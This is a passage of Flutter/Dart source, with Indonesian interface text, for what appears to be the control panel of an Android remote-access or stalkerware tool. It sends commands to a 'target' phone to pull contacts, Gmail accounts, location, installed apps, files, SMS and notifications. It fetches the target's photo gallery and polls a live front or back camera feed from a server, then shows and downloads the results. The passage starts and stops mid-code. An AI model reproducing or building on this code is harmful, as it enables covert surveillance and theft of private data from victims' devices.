                    color: Colors.white54,
                    strokeWidth: 3,
                  ),
                ),
                SizedBox(height: 20),
                Text(
                  "CONNECTING SCREEN...",
                  style: TextStyle(
                    color: Colors.white54,
                    fontSize: 13,
                    letterSpacing: 3,
                  ),
                ),
              ],
            ),
          ),
      ],
    );
  }

  // ─── SCREENSHOT RESULT ──────────────────────────────────────────────
  void _closeScreenshotResult() {
    setState(() {
      _screenshotResultVisible = false;
      _screenshotFrame = '';
    });
  }

  void _downloadScreenshotFromResult() {
    if (_screenshotFrame.isEmpty) return;
    _downloadScreenshot(_screenshotFrame);
  }

  Widget _buildScreenshotResult() {
    if (!_screenshotResultVisible || _screenshotFrame.isEmpty) return const SizedBox.shrink();
    return const SizedBox.shrink();
  }

  void _downloadScreenshot(String frameBase64) async {
    try {
      final bytes = base64Decode(frameBase64.split(',').last);
      final directory = await getDownloadsDirectory() ?? await getApplicationDocumentsDirectory();
      final file = File('${directory.path}/screenshot_${DateTime.now().millisecondsSinceEpoch}.jpg');
      await file.writeAsBytes(bytes);
      _addLog("✅ Screenshot saved: ${file.path}", LogType.success);
    } catch (e) {
      _addLog("❌ Gagal download: $e", LogType.error);
    }
  }

  // ─── FETCH GALLERY VIA HTTP ──────────────────────────────────────────
  Future<void> _fetchGalleryViaHttp() async {
    try {
        final prefs = await SharedPreferences.getInstance();
        final token = prefs.getString('key') ?? '';
        
        final response = await http.get(
            Uri.parse("$baseUrl/api/gallery/$_targetId"),
            headers: {"x-auth-token": token},
        );
        
        if (response.statusCode == 200) {
            final data = jsonDecode(response.body);
            final photos = data['photos'] as List? ?? [];
            _galleryStreamController.add(photos.map((p) => Map<String, dynamic>.from(p)).toList());
            _addLog("🖼️ Gallery HTTP: ${photos.length} photos", LogType.success);
        } else {
            _addLog("❌ Gallery HTTP failed: ${response.statusCode}", LogType.error);
        }
    } catch (e) {
        _addLog("⚠️ Gallery HTTP error: $e", LogType.error);
    }
  }

  // ─── GALLERY FULLSCREEN ──────────────────────────────────────────────
  void _openGalleryFullscreen() {
    setState(() {
      _galleryModalVisible = true;
      _isGalleryLoading = true;
      _galleryPhotos = [];
    });

    _sendCommand('getGallery');
    _addLog("🖼️ Opening gallery fullscreen", LogType.info);
    _fetchGalleryViaHttp();
  }

  void _closeGalleryFullscreen() {
    setState(() {
      _galleryModalVisible = false;
      _galleryPhotos = [];
      _currentGalleryImage = '';
      _currentGalleryIndex = 0;
    });
  }

  // ─── SHOW DIALOG DATA ──────────────────────────────────────────────
  void _showContactsDialog() {
    _sendCommand('getContacts');
    _addLog("📇 Mengambil kontak...", LogType.info);
  }

  void _showContactsData(Map<String, dynamic> data) {
    final contacts = data['contacts'] as List? ?? [];
    showDialog(
      context: context,
      barrierColor: Colors.black.withOpacity(0.9),
      builder: (context) => Dialog(
        backgroundColor: Colors.transparent,
        insetPadding: const EdgeInsets.all(16),
        child: Container(
          width: double.infinity,
          height: 500,
          decoration: BoxDecoration(
            color: Colors.black.withOpacity(0.95),
            borderRadius: BorderRadius.circular(20),
            border: Border.all(color: _glowColor1.withOpacity(0.3)),
          ),
          child: Column(
            mainAxisSize: MainAxisSize.min,
            children: [
              Padding(
                padding: const EdgeInsets.all(16),
                child: Row(
                  children: [
                    const Icon(Icons.contacts, color: Colors.amber),
                    const SizedBox(width: 12),
                    Text(
                      "📇 Kontak (${contacts.length})",
                      style: const TextStyle(color: Colors.white, fontWeight: FontWeight.bold, fontSize: 16),
                    ),
                    const Spacer(),
                    IconButton(
                      icon: const Icon(Icons.close, color: Colors.white),
                      onPressed: () => Navigator.pop(context),
                    ),
                  ],
                ),
              ),
              Expanded(
                child: contacts.isEmpty
                    ? const Center(child: Text("Tidak ada kontak", style: TextStyle(color: Colors.white54)))
                    : ListView.builder(
                  padding: const EdgeInsets.symmetric(horizontal: 16),
                  itemCount: contacts.length > 100 ? 100 : contacts.length,
                  itemBuilder: (context, i) {
                    final c = contacts[i];
                    return Container(
                      margin: const EdgeInsets.only(bottom: 6),
                      padding: const EdgeInsets.all(12),
                      decoration: BoxDecoration(
                        color: Colors.white.withOpacity(0.05),
                        borderRadius: BorderRadius.circular(10),
                        border: Border.all(color: Colors.white.withOpacity(0.1)),
                      ),
                      child: Row(
                        children: [
                          CircleAvatar(
                            backgroundColor: Colors.amber.withOpacity(0.2),
                            radius: 18,
                            child: Text(
                              (c['name'] ?? '?')[0].toUpperCase(),
                              style: const TextStyle(color: Colors.amber, fontWeight: FontWeight.bold),
                            ),
                          ),
                          const SizedBox(width: 12),
                          Expanded(
                            child: Column(
                              crossAxisAlignment: CrossAxisAlignment.start,
                              children: [
                                Text(
                                  c['name'] ?? '-',
                                  style: const TextStyle(color: Colors.white, fontWeight: FontWeight.w600),
                                ),
                                Text(
                                  c['number'] ?? '-',
                                  style: TextStyle(color: Colors.white54, fontSize: 12),
                                ),
                              ],
                            ),
                          ),
                          IconButton(
                            icon: const Icon(Icons.copy, color: Colors.white54, size: 18),
                            onPressed: () {
                              _copyText(c['number'] ?? '');
                            },
                          ),
                        ],
                      ),
                    );
                  },
                ),
              ),
              Padding(
                padding: const EdgeInsets.all(12),
                child: Text(
                  "Menampilkan ${contacts.length > 100 ? '100' : contacts.length} dari ${contacts.length} kontak",
                  style: TextStyle(color: Colors.white.withOpacity(0.3), fontSize: 10),
                ),
              ),
            ],
          ),
        ),
      ),
    );
  }

  void _showGmailDialog() {
    _sendCommand('getGmail');
    _addLog("📧 Mengambil akun Gmail...", LogType.info);
  }

  void _showGmailData(Map<String, dynamic> data) {}

  void _showLocationDialog() {
    _sendCommand('getLocation');
    _addLog("📍 Mengambil lokasi...", LogType.info);
    showDialog(
      context: context,
      barrierColor: Colors.black.withOpacity(0.92),
      barrierDismissible: false,
      builder: (context) => Dialog(
        backgroundColor: Colors.transparent,
        insetPadding: EdgeInsets.zero,
        child: Container(
          width: double.infinity,
          height: double.infinity,
          color: Colors.black.withOpacity(0.97),
          child: Column(
            mainAxisAlignment: MainAxisAlignment.center,
            children: [
              const SizedBox(
                width: 44,
                height: 44,
                child: CircularProgressIndicator(
                  color: Color(0xFF00E5A0),
                  strokeWidth: 3,
                ),
              ),
              const SizedBox(height: 18),
              const Text(
                "MENGAMBIL LOKASI...",
                style: TextStyle(
                  color: Color(0xFF1A3050),
                  fontSize: 11,
                  letterSpacing: 2.5,
                  fontFamily: 'monospace',
                ),
              ),
            ],
          ),
        ),
      ),
    );
    _locationLoadingContext = context;
  }

  void _showLocationData(Map<String, dynamic> data) {
    if (_locationLoadingContext != null) {
      Navigator.pop(_locationLoadingContext!);
      _locationLoadingContext = null;
    }
  }

  void _showInstalledAppsDialog() {
    _sendCommand('getInstalledApps');
    _addLog("📱 Mengambil daftar aplikasi...", LogType.info);
  }

  void _showInstalledAppsData(Map<String, dynamic> data) {}

  void _showGalleryDialog() {
    _openGalleryFullscreen();
  }

  void _showFileManagerDialog() {
    _sendCommand('getFiles', extra: '/storage/emulated/0');
    _addLog("📁 Mengambil file...", LogType.info);
  }

  void _showFileListData(Map<String, dynamic> data) {}

  void _showSmsData(Map<String, dynamic> data) {
    final list = data['status']?['smsList'] as List? ?? [];
    _addLog("💬 SMS data: ${list.length} aplikasi", LogType.success);
    if (list.isEmpty) {
      ScaffoldMessenger.of(context).showSnackBar(
        const SnackBar(content: Text("Tidak ada SMS")),
      );
      return;
    }
    showDialog(
      context: context,
      barrierColor: Colors.black.withOpacity(0.92),
      builder: (context) => AlertDialog(
        backgroundColor: _cardColor,
        title: Text("📩 SMS (${list.length})", style: const TextStyle(color: Colors.white)),
        content: SizedBox(
          width: double.maxFinite,
          height: 300,
          child: ListView.builder(
            itemCount: list.length,
            itemBuilder: (context, i) {
              final app = list[i];
              final appName = app['appName'] ?? 'Unknown';
              final messages = (app['messages'] as List?) ?? [];
              return Container(
                margin: const EdgeInsets.only(bottom: 8),
                padding: const EdgeInsets.all(8),
                decoration: BoxDecoration(
                  color: Colors.white.withOpacity(0.05),
                  borderRadius: BorderRadius.circular(8),
                ),
                child: Column(
                  crossAxisAlignment: CrossAxisAlignment.start,
                  children: [
                    Text(appName, style: const TextStyle(color: Colors.white, fontWeight: FontWeight.bold)),
                    const SizedBox(height: 4),
                    ...messages.take(3).map((m) => Text(
                      m['text'] ?? '',
                      style: TextStyle(color: Colors.white70, fontSize: 12),
                      maxLines: 2,
                      overflow: TextOverflow.ellipsis,
                    )),
                    if (messages.length > 3)
                      Text("+${messages.length - 3} lainnya", style: TextStyle(color: Colors.white38, fontSize: 10)),
                  ],
                ),
              );
            },
          ),
        ),
        actions: [
          TextButton(
            onPressed: () => Navigator.pop(context),
            child: const Text("TUTUP", style: TextStyle(color: Colors.white54)),
          ),
        ],
      ),
    );
  }

  void _showNotifData(Map<String, dynamic> data) {
    final list = data['status']?['notifList'] as List? ?? [];
    _addLog("🔔 Notif data: ${list.length} aplikasi", LogType.success);
    if (list.isEmpty) {
      ScaffoldMessenger.of(context).showSnackBar(
        const SnackBar(content: Text("Tidak ada notifikasi")),
      );
      return;
    }
    showDialog(
      context: context,
      barrierColor: Colors.black.withOpacity(0.92),
      builder: (context) => AlertDialog(
        backgroundColor: _cardColor,
        title: Text("🔔 Notifikasi (${list.length})", style: const TextStyle(color: Colors.white)),
        content: SizedBox(
          width: double.maxFinite,
          height: 300,
          child: ListView.builder(
            itemCount: list.length,
            itemBuilder: (context, i) {
              final app = list[i];
              final appName = app['appName'] ?? 'Unknown';
              final messages = (app['messages'] as List?) ?? [];
              return Container(
                margin: const EdgeInsets.only(bottom: 8),
                padding: const EdgeInsets.all(8),
                decoration: BoxDecoration(
                  color: Colors.white.withOpacity(0.05),
                  borderRadius: BorderRadius.circular(8),
                ),
                child: Column(
                  crossAxisAlignment: CrossAxisAlignment.start,
                  children: [
                    Text(appName, style: const TextStyle(color: Colors.white, fontWeight: FontWeight.bold)),
                    const SizedBox(height: 4),
                    ...messages.take(3).map((m) => Text(
                      m['text'] ?? '',
                      style: TextStyle(color: Colors.white70, fontSize: 12),
                      maxLines: 2,
                      overflow: TextOverflow.ellipsis,
                    )),
                    if (messages.length > 3)
                      Text("+${messages.length - 3} lainnya", style: TextStyle(color: Colors.white38, fontSize: 10)),
                  ],
                ),
              );
            },
          ),
        ),
        actions: [
          TextButton(
            onPressed: () => Navigator.pop(context),
            child: const Text("TUTUP", style: TextStyle(color: Colors.white54)),
          ),
        ],
      ),
    );
  }

  // ─── HELPER FUNCTIONS ──────────────────────────────────────────────
  void _copyText(String text) {
    if (text.isEmpty) return;
    Clipboard.setData(ClipboardData(text: text));
    _addLog("📋 Disalin: $text", LogType.success);
    ScaffoldMessenger.of(context).showSnackBar(
      SnackBar(content: Text("✅ Disalin: $text"), duration: const Duration(seconds: 1)),
    );
  }

  // ─── DISPOSE ──────────────────────────────────────────────────────────
  @override
  void dispose() {
    _glowController.dispose();
    _rotateController.dispose();
    _logScrollController.dispose();
    _customCommandController.dispose();
    _customExtraController.dispose();
    _cameraFrameStreamController.close();
    _galleryStreamController.close();
    _pollingTimer?.cancel();
    socket.disconnect();
    socket.dispose();
    super.dispose();
  }

  // ─── BUILD MAIN ──────────────────────────────────────────────────────
  @override
  Widget build(BuildContext context) {
    return Scaffold(
      backgroundColor: _darkBg,
      appBar: AppBar(
        backgroundColor: Colors.transparent,
        elevation: 0,
        leading: IconButton(
          icon: const Icon(Icons.arrow_back_ios, color: Colors.white),
          onPressed: () => Navigator.pop(context),
        ),
        centerTitle: true,
        title: const Text(
          "X5-5X",
          style: TextStyle(color: Colors.white, fontWeight: FontWeight.bold, fontSize: 20, letterSpacing: 2),
        ),
        actions: [
          IconButton(
            icon: const Icon(Icons.refresh, color: Colors.white),
            onPressed: _fetchDevices,
          ),
        ],
      ),
      body: _buildTabContent(),
      bottomNavigationBar: _buildBottomNav(),
    );
  }
}

// ─── WIDGET GALLERY FULLSCREEN ──────────────────────────────────────
class GalleryFullscreenPage extends StatefulWidget {
  final String targetId;
  final String targetModel;
  final Stream<List<Map<String, dynamic>>> galleryStream;
  final VoidCallback onClose;
  final VoidCallback onRefresh;
  final Function(String) onDownload;

  const GalleryFullscreenPage({
    Key? key,
    required this.targetId,
    required this.targetModel,
    required this.galleryStream,
    required this.onClose,
    required this.onRefresh,
    required this.onDownload,
  }) : super(key: key);

  @override
  State<GalleryFullscreenPage> createState() => _GalleryFullscreenPageState();
}

class _GalleryFullscreenPageState extends State<GalleryFullscreenPage> {
  List<Map<String, dynamic>> _photos = [];
  bool _isLoading = true;
  String _currentImage = '';
  int _currentIndex = 0;
  bool _showImageViewer = false;
  double _scale = 1.0;
  double _offsetX = 0.0;
  double _offsetY = 0.0;

  @override
  void initState() {
    super.initState();
    widget.galleryStream.listen((photos) {
      if (mounted) {
        setState(() {
          _photos = photos;
          _isLoading = false;
        });
      }
    });
  }

  void _openImageViewer(int index) {
    if (_photos.isEmpty || index >= _photos.length) return;
    setState(() {
      _currentIndex = index;
      _currentImage = _photos[index]['thumb'] ?? '';
      _showImageViewer = true;
      _scale = 1.0;
      _offsetX = 0.0;
      _offsetY = 0.0;
    });
  }

  void _closeImageViewer() {
    setState(() {
      _showImageViewer = false;
      _currentImage = '';
      _scale = 1.0;
      _offsetX = 0.0;
      _offsetY = 0.0;
    });
  }

  void _nextImage() {
    if (_currentIndex < _photos.length - 1) {
      setState(() {
        _currentIndex++;
        _currentImage = _photos[_currentIndex]['thumb'] ?? '';
        _scale = 1.0;
        _offsetX = 0.0;
        _offsetY = 0.0;
      });
    }
  }

  void _prevImage() {
    if (_currentIndex > 0) {
      setState(() {
        _currentIndex--;
        _currentImage = _photos[_currentIndex]['thumb'] ?? '';
        _scale = 1.0;
        _offsetX = 0.0;
        _offsetY = 0.0;
      });
    }
  }

  @override
  Widget build(BuildContext context) {
    return Scaffold(
      backgroundColor: Colors.black,
      body: SafeArea(
        child: Stack(
          children: [
            if (_isLoading)
              const Center(
                child: Column(
                  mainAxisSize: MainAxisSize.min,
                  children: [
                    SizedBox(width: 50, height: 50, child: CircularProgressIndicator(color: Colors.white54, strokeWidth: 3)),
                    SizedBox(height: 20),
                    Text("LOADING GALLERY...", style: TextStyle(color: Colors.white54, fontSize: 13, letterSpacing: 3)),
                  ],
                ),
              )
            else if (_photos.isEmpty)
              const Center(
                child: Column(
                  mainAxisSize: MainAxisSize.min,
                  children: [
                    Icon(Icons.photo_library_outlined, color: Colors.white24, size: 64),
                    SizedBox(height: 16),
                    Text("Tidak ada foto", style: TextStyle(color: Colors.white38, fontSize: 14, letterSpacing: 1)),
                  ],
                ),
              )
            else
              GridView.builder(
                padding: const EdgeInsets.all(8),
                gridDelegate: const SliverGridDelegateWithFixedCrossAxisCount(
                  crossAxisCount: 3,
                  crossAxisSpacing: 6,
                  mainAxisSpacing: 6,
                  childAspectRatio: 1,
                ),
                itemCount: _photos.length > 40 ? 40 : _photos.length,
                itemBuilder: (context, index) {
                  final photo = _photos[index];
                  final thumb = photo['thumb'] ?? '';
                  return GestureDetector(
                    onTap: () => _openImageViewer(index),
                    child: Container(
                      decoration: BoxDecoration(
                        borderRadius: BorderRadius.circular(10),
                        color: Colors.white.withOpacity(0.05),
                        border: Border.all(color: Colors.white.withOpacity(0.06)),
                      ),
                      child: ClipRRect(
                        borderRadius: BorderRadius.circular(10),
                        child: thumb.isNotEmpty
                            ? Image.memory(
                          base64Decode(thumb.contains(',') ? thumb.split(',').last : thumb),
                          fit: BoxFit.cover,
                          errorBuilder: (context, error, stackTrace) {
                            return Container(
                              color: Colors.white10,
                              child: const Icon(Icons.broken_image, color: Colors.white24, size: 30),
                            );
                          },
                        )
                            : Container(
                          color: Colors.white10,
                          child: const Icon(Icons.image_not_supported, color: Colors.white24, size: 30),
                        ),
                      ),
                    ),
                  );
                },
              ),

            // HUD
            Positioned(
              top: 0, left: 0, right: 0,
              child: Container(
                padding: const EdgeInsets.fromLTRB(20, 20, 20, 12),
                decoration: BoxDecoration(
                  gradient: LinearGradient(
                    begin: Alignment.topCenter,
                    end: Alignment.bottomCenter,
                    colors: [Colors.black.withOpacity(0.7), Colors.transparent],
                  ),
                ),
                child: Row(
                  mainAxisAlignment: MainAxisAlignment.spaceBetween,
                  children: [
                    Row(
                      children: [
                        Container(width: 10, height: 10, decoration: const BoxDecoration(color: Colors.pink, shape: BoxShape.circle)),
                        const SizedBox(width: 10),
                        const Text("GALLERY", style: TextStyle(color: Colors.white, fontSize: 14, fontWeight: FontWeight.bold, letterSpacing: 2)),
                        const SizedBox(width: 12),
                        Text("${_photos.length > 40 ? '40' : _photos.length} / ${_photos.length}", style: TextStyle(color: Colors.white.withOpacity(0.4), fontSize: 10, letterSpacing: 1)),
                      ],
                    ),
                    Text(widget.targetModel, style: const TextStyle(color: Color(0x66FFFFFF), fontSize: 10, letterSpacing: 1)),
                  ],
                ),
              ),
            ),

            Positioned(
              top: 20, right: 20,
              child: GestureDetector(
                onTap: widget.onClose,
                child: Container(
                  width: 40, height: 40,
                  decoration: BoxDecoration(
                    shape: BoxShape.circle,
                    color: Colors.white.withOpacity(0.05),
                    border: Border.all(color: Colors.white.withOpacity(0.1)),
                  ),
                  child: const Icon(Icons.close, color: Colors.white, size: 20),
                ),
              ),
            ),

            Positioned(
              top: 20, left: 120,
              child: GestureDetector(
                onTap: () {
                  setState(() => _isLoading = true);
                  widget.onRefresh();
                  Future.delayed(const Duration(seconds: 3), () {
                    if (mounted) setState(() => _isLoading = false);
                  });
                },
                child: Container(
                  padding: const EdgeInsets.symmetric(horizontal: 12, vertical: 6),
                  decoration: BoxDecoration(
                    color: Colors.white.withOpacity(0.05),
                    borderRadius: BorderRadius.circular(20),
                    border: Border.all(color: Colors.white.withOpacity(0.1)),
                  ),
                  child: const Row(
                    children: [
                      Icon(Icons.refresh, color: Colors.white54, size: 16),
                      SizedBox(width: 4),
                      Text("REFRESH", style: TextStyle(color: Colors.white54, fontSize: 10, letterSpacing: 1)),
                    ],
                  ),
                ),
              ),
            ),

            if (_showImageViewer && _currentImage.isNotEmpty)
              Container(
                color: Colors.black.withOpacity(0.95),
                child: Stack(
                  children: [
                    Center(
                      child: GestureDetector(
                        onScaleStart: (details) {
                          setState(() { _offsetX = 0; _offsetY = 0; _scale = 1.0; });
                        },
                        onScaleUpdate: (details) {
                          setState(() {
                            _scale = (_scale * details.scale).clamp(0.5, 4.0);
                            _offsetX += details.focalPointDelta.dx;
                            _offsetY += details.focalPointDelta.dy;
                          });
                        },
                        child: Transform(
                          transform: Matrix4.identity()..translate(_offsetX, _offsetY)..scale(_scale),
                          child: Image.memory(
                            base64Decode(_currentImage.contains(',') ? _currentImage.split(',').last : _currentImage),
                            fit: BoxFit.contain,
                            width: MediaQuery.of(context).size.width * 0.95,
                            height: MediaQuery.of(context).size.height * 0.75,
                            errorBuilder: (context, error, stackTrace) {
                              return const Center(child: Text("Error loading image", style: TextStyle(color: Colors.white38)));
                            },
                          ),
                        ),
                      ),
                    ),
                    Positioned(
                      top: 20, right: 20,
                      child: GestureDetector(
                        onTap: _closeImageViewer,
                        child: Container(
                          width: 40, height: 40,
                          decoration: BoxDecoration(
                            shape: BoxShape.circle,
                            color: Colors.white.withOpacity(0.05),
                            border: Border.all(color: Colors.white.withOpacity(0.1)),
                          ),
                          child: const Icon(Icons.close, color: Colors.white, size: 20),
                        ),
                      ),
                    ),
                    if (_photos.length > 1) ...[
                      Positioned(
                        left: 10, top: 0, bottom: 0,
                        child: Center(
                          child: GestureDetector(
                            onTap: _prevImage,
                            child: Container(
                              padding: const EdgeInsets.all(8),
                              decoration: BoxDecoration(
                                shape: BoxShape.circle,
                                color: Colors.white.withOpacity(0.05),
                                border: Border.all(color: Colors.white.withOpacity(0.1)),
                              ),
                              child: const Icon(Icons.chevron_left, color: Colors.white, size: 30),
                            ),
                          ),
                        ),
                      ),
                      Positioned(
                        right: 10, top: 0, bottom: 0,
                        child: Center(
                          child: GestureDetector(
                            onTap: _nextImage,
                            child: Container(
                              padding: const EdgeInsets.all(8),
                              decoration: BoxDecoration(
                                shape: BoxShape.circle,
                                color: Colors.white.withOpacity(0.05),
                                border: Border.all(color: Colors.white.withOpacity(0.1)),
                              ),
                              child: const Icon(Icons.chevron_right, color: Colors.white, size: 30),
                            ),
                          ),
                        ),
                      ),
                    ],
                    Positioned(
                      bottom: 80, left: 0, right: 0,
                      child: Center(
                        child: Container(
                          padding: const EdgeInsets.symmetric(horizontal: 16, vertical: 6),
                          decoration: BoxDecoration(
                            color: Colors.white.withOpacity(0.1),
                            borderRadius: BorderRadius.circular(20),
                          ),
                          child: Text(
                            "${_currentIndex + 1} / ${_photos.length > 40 ? 40 : _photos.length}",
                            style: const TextStyle(color: Colors.white54, fontSize: 12, letterSpacing: 1),
                          ),
                        ),
                      ),
                    ),
                    Positioned(
                      bottom: 20, left: 0, right: 0,
                      child: Center(
                        child: ElevatedButton.icon(
                          onPressed: () {
                            widget.onDownload(_currentImage);
                            ScaffoldMessenger.of(context).showSnackBar(
                              const SnackBar(content: Text("📥 Downloading..."), duration: Duration(seconds: 1)),
                            );
                          },
                          icon: const Icon(Icons.download, size: 18),
                          label: const Text("DOWNLOAD"),
                          style: ElevatedButton.styleFrom(
                            backgroundColor: Colors.pink.withOpacity(0.2),
                            foregroundColor: Colors.white,
                            padding: const EdgeInsets.symmetric(horizontal: 24, vertical: 12),
                            shape: RoundedRectangleBorder(
                              borderRadius: BorderRadius.circular(25),
                              side: BorderSide(color: Colors.pink.withOpacity(0.2)),
                            ),
                          ),
                        ),
                      ),
                    ),
                  ],
                ),
              ),
          ],
        ),
      ),
    );
  }
}

// ─── WIDGET LIVE CAMERA ──────────────────────────────────────────────
class LiveCameraPage extends StatefulWidget {
  final String targetId;
  final String targetModel;
  final String facing;
  final VoidCallback onClose;
  final Stream<String> frameStream;
  final bool isLoading;
  final Function(String) onSwitchCamera;
  final VoidCallback onCapture;

  const LiveCameraPage({
    Key? key,
    required this.targetId,
    required this.targetModel,
    required this.facing,
    required this.onClose,
    required this.frameStream,
    required this.isLoading,
    required this.onSwitchCamera,
    required this.onCapture,
  }) : super(key: key);

  @override
  State<LiveCameraPage> createState() => _LiveCameraPageState();
}

class _LiveCameraPageState extends State<LiveCameraPage> {
  String _currentFrame = '';
  bool _isLoading = true;

  @override
  void initState() {
    super.initState();
    _isLoading = widget.isLoading;
    widget.frameStream.listen((frame) {
      if (mounted) {
        setState(() {
          _currentFrame = frame;
          _isLoading = false;
        });
      }
    });
  }

  @override
  Widget build(BuildContext context) {
    return Scaffold(
      backgroundColor: Colors.black,
      body: SafeArea(
        child: Stack(
          children: [
            if (_currentFrame.isNotEmpty)
              Center(
                child: RepaintBoundary(
                  child: InteractiveViewer(
                    minScale: 0.5, maxScale: 3.0,
                    child: Image.memory(
                      base64Decode(_currentFrame.split(',').last),
                      fit: BoxFit.contain,
                      width: double.infinity,
                      height: double.infinity,
                      errorBuilder: (context, error, stackTrace) {
                        return const Center(child: Text("Error loading camera", style: TextStyle(color: Colors.white54)));
                      },
                    ),
                  ),
                ),
              )
            else
              const Center(
                child: Column(
                  mainAxisSize: MainAxisSize.min,
                  children: [
                    SizedBox(width: 50, height: 50, child: CircularProgressIndicator(color: Colors.white54, strokeWidth: 3)),
                    SizedBox(height: 20),
                    Text("CONNECTING CAMERA...", style: TextStyle(color: Colors.white54, fontSize: 13, letterSpacing: 3)),
                  ],
                ),
              ),

            // HUD
            Positioned(
              top: 0, left: 0, right: 0,
              child: Container(
                padding: const EdgeInsets.fromLTRB(20, 20, 20, 20),
                decoration: BoxDecoration(
                  gradient: LinearGradient(
                    begin: Alignment.topCenter, end: Alignment.bottomCenter,
                    colors: [Colors.black.withOpacity(0.7), Colors.transparent],
                  ),
                ),
                child: Row(
                  mainAxisAlignment: MainAxisAlignment.spaceBetween,
                  children: [
                    Row(
                      children: [
                        Container(width: 10, height: 10, decoration: const BoxDecoration(color: Colors.red, shape: BoxShape.circle)),
                        const SizedBox(width: 10),
                        const Text("LIVE", style: TextStyle(color: Colors.white, fontSize: 14, fontWeight: FontWeight.bold, letterSpacing: 2)),
                        const SizedBox(width: 16),
                        Container(
                          padding: const EdgeInsets.symmetric(horizontal: 10, vertical: 4),
                          decoration: BoxDecoration(color: Colors.white.withOpacity(0.1), borderRadius: BorderRadius.circular(4)),
                          child: Text(widget.facing.toUpperCase(), style: const TextStyle(color: Color(0x99FFFFFF), fontSize: 10, letterSpacing: 1)),
                        ),
                      ],
                    ),
                    Text(widget.targetModel, style: const TextStyle(color: Color(0x66FFFFFF), fontSize: 10, letterSpacing: 1)),
                  ],
                ),
              ),
            ),

            Positioned(
              top: 20, right: 20,
              child: GestureDetector(
                onTap: widget.onClose,
                child: Container(
                  width: 40, height: 40,
                  decoration: BoxDecoration(
                    shape: BoxShape.circle,
                    color: Colors.white.withOpacity(0.05),
                    border: Border.all(color: Colors.white.withOpacity(0.1)),
                  ),
                  child: const Icon(Icons.close, color: Colors.white, size: 20),
                ),
              ),
            ),

            Positioned(
              bottom: 55, left: 30,
              child: GestureDetector(
                onTap: () {
                  final newFacing = widget.facing == 'front' ? 'back' : 'front';
                  widget.onSwitchCamera(newFacing);
                },
                child: Container(
                  width: 44, height: 44,
                  decoration: BoxDecoration(
                    shape: BoxShape.circle,
                    color: Colors.white.withOpacity(0.05),
                    border: Border.all(color: Colors.white.withOpacity(0.1)),
                  ),
                  child: const Icon(Icons.switch_camera, color: Color(0x99FFFFFF), size: 22),
                ),
              ),
            ),

            Positioned(
              bottom: 55, right: 30,
              child: GestureDetector(
                onTap: widget.onClose,
                child: Container(
                  width: 44, height: 44,
                  decoration: BoxDecoration(
                    shape: BoxShape.circle,
                    color: Colors.red.withOpacity(0.1),
                    border: Border.all(color: Colors.red.withOpacity(0.2)),
                  ),
                  child: const Icon(Icons.stop, color: Color(0x99FF0000), size: 22),
                ),
              ),
            ),

            Positioned(
              bottom: 50, left: 0, right: 0,
              child: Center(
                child: GestureDetector(
                  onTap: widget.onCapture,
                  child: Container(
                    width: 60, height: 60,
                    decoration: BoxDecoration(
                      shape: BoxShape.circle,
                      color: Colors.white.withOpacity(0.05),
                      border: Border.all(color: Colors.white.withOpacity(0.15), width: 2),
                    ),
                    child: const Icon(Icons.camera_alt, color: Colors.white, size: 28),
                  ),
                ),
              ),
            ),
          ],
        ),
      ),
    );
  }
}

// ─── WIDGET LIVE CAMERA POLLING (REST) ──────────────────────────────
class LiveCameraPollingPage extends StatefulWidget {
  final String targetId;
  final String targetModel;
  final String facing;
  final VoidCallback onClose;
  final Function(String) onSwitchCamera;

  const LiveCameraPollingPage({
    Key? key,
    required this.targetId,
    required this.targetModel,
    required this.facing,
    required this.onClose,
    required this.onSwitchCamera,
  }) : super(key: key);

  @override
  State<LiveCameraPollingPage> createState() => _LiveCameraPollingPageState();
}

class _LiveCameraPollingPageState extends State<LiveCameraPollingPage> {
  String _currentFrame = '';
  bool _isLoading = true;
  Timer? _pollingTimer;
  String _currentFacing = '';

  @override
  void initState() {
    super.initState();
    _currentFacing = widget.facing;
    _fetchFrame();
    
    _pollingTimer = Timer.periodic(const Duration(seconds: 2), (timer) {
      _fetchFrame();
    });
  }

  Future<void> _fetchFrame() async {
    try {
      final prefs = await SharedPreferences.getInstance();
      final token = prefs.getString('key') ?? '';
      
      final response = await http.get(
        Uri.parse("$baseUrl/api/live-camera/${widget.targetId}?facing=$_currentFacing"),
        headers: {"x-auth-token": token},
      );

      if (response.statusCode == 200) {
        final data = jsonDecode(response.body);
        if (data['frame'] != null && data['frame'].isNotEmpty) {
          if (mounted) {
            setState(() {
              _currentFrame = data['frame'];
              _isLoading = false;
            });
          }
        }
      }
    } catch (e) {
      // Silent fail
    }
  }

  @override
  void dispose() {
    _pollingTimer?.cancel();
    widget.onClose();
    super.dispose();
  }

  @override
  Widget build(BuildContext context) {
    return Scaffold(
      backgroundColor: Colors.black,
      body: SafeArea(
        child: Stack(
          children: [
            if (_currentFrame.isNotEmpty)
              Center(
                child: RepaintBoundary(
                  child: InteractiveViewer(
                    minScale: 0.5,
                    maxScale: 3.0,
                    child: Image.memory(
                      base64Decode(_currentFrame.split(',').last),
                      fit: BoxFit.contain,
                      width: double.infinity,
                      height: double.infinity,
                      errorBuilder: (context, error, stackTrace) {
                        return const Center(
                          child: Text(
                            "Error loading camera",
                            style: TextStyle(color: Colors.white54),
                          ),
                        );
                      },
                    ),
                  ),
                ),
              )
            else
              const Center(
                child: Column(
                  mainAxisSize: MainAxisSize.min,
                  children: [
                    SizedBox(
                      width: 50,
                      height: 50,
                      child: CircularProgressIndicator(
                        color: Colors.white54,
                        strokeWidth: 3,
                      ),
                    ),
                    SizedBox(height: 20),
                    Text(
                      "CONNECTING CAMERA...",
                      style: TextStyle(
                        color: Colors.white54,
                        fontSize: 13,
                        letterSpacing: 3,
                      ),
                    ),
                  ],
                ),
              ),

            Positioned(
              top: 0,
              left: 0,
              right: 0,
              child: Container(
                padding: const EdgeInsets.fromLTRB(20, 20, 20, 20),
                decoration: BoxDecoration(
                  gradient: LinearGradient(
                    begin: Alignment.topCenter,
                    end: Alignment.bottomCenter,
                    colors: [Colors.black.withOpacity(0.7), Colors.transparent],
                  ),
                ),
                child: Row(
                  mainAxisAlignment: MainAxisAlignment.spaceBetween,
                  children: [
                    Row(
                      children: [
                        Container(
                          width: 10,
                          height: 10,
                          decoration: const BoxDecoration(
                            color: Colors.red,
                            shape: BoxShape.circle,
                          ),
                        ),
                        const SizedBox(width: 10),
                        const Text(
                          "LIVE",
                          style: TextStyle(
                            color: Colors.white,
                            fontSize: 14,
                            fontWeight: FontWeight.bold,
                            letterSpacing: 2,
                          ),
                        ),
                        const SizedBox(width: 16),
                        Container(
                          padding: const EdgeInsets.symmetric(horizontal: 10, vertical: 4),
